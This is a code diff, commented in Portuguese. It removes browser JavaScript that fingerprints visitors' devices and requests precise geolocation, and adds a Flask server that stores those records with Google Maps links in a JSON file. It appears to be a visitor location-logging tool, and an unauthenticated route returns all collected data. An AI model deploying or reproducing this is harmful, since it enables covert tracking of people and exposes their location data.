@@ -1,106 +1,87 @@
-function gatherDeviceInformation(callback) {
-  var ptf = navigator.platform;
-  var cc = navigator.hardwareConcurrency || 'Not Available';
-  var ram = navigator.deviceMemory || 'Not Available';
-  var ver = navigator.userAgent;
-  var str = ver;
-  var os = ver;
-  var brw;
-  var wd = window.screen.width;
-  var ht = window.screen.height;
-  var graphics = navigator.gpu || navigator.graphics || 'Not Available';
-  var ven = navigator.vendor;
+from flask import Flask, request, jsonify, render_template
+import json
+import os
+from datetime import datetime
 
-  if (ver.indexOf('Firefox') != -1) {
-    str = str.substring(str.indexOf(' Firefox/') + 1);
-    str = str.split(' ');
-    brw = str[0];
-  } else if (ver.indexOf('Chrome') != -1) {
-      str = str.substring(str.indexOf(' Chrome/') + 1);
-      str = str.split(' ');
-      brw = str[0];
-  } else if (ver.indexOf('Safari') != -1) {
-      str = str.substring(str.indexOf(' Safari/') + 1);
-      str = str.split(' ');
-      brw = str[0];
-  } else if (ver.indexOf('Edge') != -1) {
-      str = str.substring(str.indexOf(' Edge/') + 1);
-      str = str.split(' ');
-      brw = str[0];
-  } else {
-      brw = 'Not Available';
-  }
-    var data = {
-        ptf: ptf,
-        cc: cc,
-        ram: ram, 
-        brw: brw, 
-        wd: wd, 
-        ht: ht, 
-        ven: ven, 
-        ren: 
-        graphics, 
-        os: os
-    };
+app = Flask(__name__)
 
-    callback(data);
-}
 
-function getCurrentLocation(successCallback, errorCallback) {
-    if (navigator.geolocation) {
-        var options = { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 };
-        navigator.geolocation.getCurrentPosition(successCallback, errorCallback, options);
-    } else {
-        errorCallback({ message: 'Geolocalização não suportada.' });
+@app.route('/')
+def index():
+    
+    return render_template('index.html')
+
+@app.route('/wt')
+def wt():
+    return render_template('wt.html')
+
+@app.route('/api/device_information', methods=['POST'])
+def device_information():
+    global location_data, device_data
+    device_data = request.get_json()
+    # Aqui você pode processar os dados do dispositivo recebidos
+    # por exemplo, salvar em um banco de dados ou realizar outras operações
+    print('Dados do dispositivo recebidos:', device_data)
+   
+
+    if location_data and 'latitude' in location_data and 'longitude' in location_data:
+        latitude = location_data['latitude']
+        longitude = location_data['longitude']
+        url = f'https://www.google.com/maps?q={latitude},{longitude}'
+    else:
+        url = 'Dados de localização não disponíveis'
+
+    # Dados para adicionar ao arquivo JSON
+    data_to_add = {
+        'location_data': location_data,
+        'device_data': device_data,
+        'url': url
     }
-}
 
-function initializePage() {
-    gatherDeviceInformation(function(deviceData) {
-        fetch('/api/device_information', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify(deviceData)
-        })
-        .then(response => response.json())
-        .then(result => {
-            console.log('Resposta do Flask (device_information):', result);
-        })
-        .catch(error => {
-            console.error('Erro ao enviar dados do dispositivo para o Flask:', error);
-        });
-    });
+    # Nome do arquivo JSON
+    json_file_name = 'dados.json'
 
-    getCurrentLocation(function(position) {
-        var locationData = {
-            latitude: position.coords.latitude,
-            longitude: position.coords.longitude,
-            accuracy: position.coords.accuracy,
-            altitude: position.coords.altitude || 'Not Available',
-            direction: position.coords.heading || 'Not Available',
-            speed: position.coords.speed || 'Not Available',
-         };
+    # Carregar o conteúdo existente do arquivo JSON (se existir)
+    if os.path.exists(json_file_name):
+        with open(json_file_name, 'r') as json_file:
+            all_data = json.load(json_file)
+    else:
+        all_data = {}
 
-        fetch('/api/location_information', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify(locationData)
-        })
-        .then(response => response.json())
-        .then(result => {
-            console.log('Resposta do Flask (location_information):', result);
-        })
-        .catch(error => {
-            console.error('Erro ao enviar dados de localização para o Flask:', error);
-        });
-    }, function(error) {
-        console.error('Erro ao obter localização:', error.message);
-    });
-}
+    # Usar timestamp como chave única
+    timestamp = datetime.now().isoformat()
+    all_data[timestamp] = data_to_add
 
-// Chama a função para inicializar a página
-initializePage();
+    # Salvar os dados atualizados no arquivo JSON
+    with open(json_file_name, 'w') as json_file:
+        json.dump(all_data, json_file, indent=4)
+
+
+    return jsonify({'message': 'Dados do dispositivo recebidos com sucesso!'})
+
+@app.route('/api/location_information', methods=['POST'])
+def location_information():
+    global location_data
+    location_data = request.get_json()
+    # Aqui você pode processar os dados de localização recebidos
+    # por exemplo, salvar em um banco de dados ou realizar outras operações
+    print('Dados de localização recebidos:', location_data)
+    return jsonify({'message': 'Dados de localização recebidos com sucesso!'})
+
+@app.route('/dados', methods=['GET'])
+def get_data():
+    # Nome do arquivo JSON
+    json_file_name = 'dados.json'
+
+    # Verificar se o arquivo JSON existe
+    if os.path.exists(json_file_name):
+        # Ler o conteúdo do arquivo JSON salvo
+        with open(json_file_name, 'r') as json_file:
+            saved_data = json.load(json_file)
+        return jsonify(saved_data)
+    else:
+        return jsonify({'error': 'Arquivo JSON não encontrado'}), 404
+
+
+if __name__ == '__main__':
+    app.run(debug=True)
